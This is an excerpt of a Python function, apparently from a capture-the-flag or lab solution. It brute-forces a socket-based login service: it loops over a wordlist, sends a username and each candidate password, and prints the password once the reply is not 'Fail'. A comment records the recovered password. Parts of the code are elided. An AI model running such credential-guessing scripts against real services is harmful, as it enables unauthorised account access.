...
def brute_force():
    ...
    # iterate through each line in the wordlist as individual passwords
    for password in wl:
        # Establish socket connection
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))

        # read in username prompt
        response = s.recv(1024)
        # send username
        username_format = str(len(username) + 1) + "s"
        username_payload = struct.pack(username_format, (username + "\n").encode("utf-8"))
        ...
        # read in login status response
        response = s.recv(1024)
        s.close
        
        if response.decode() != "Fail\n":
            print(response.decode())
            print("Password is: " + password) # linkinpark
            exit()
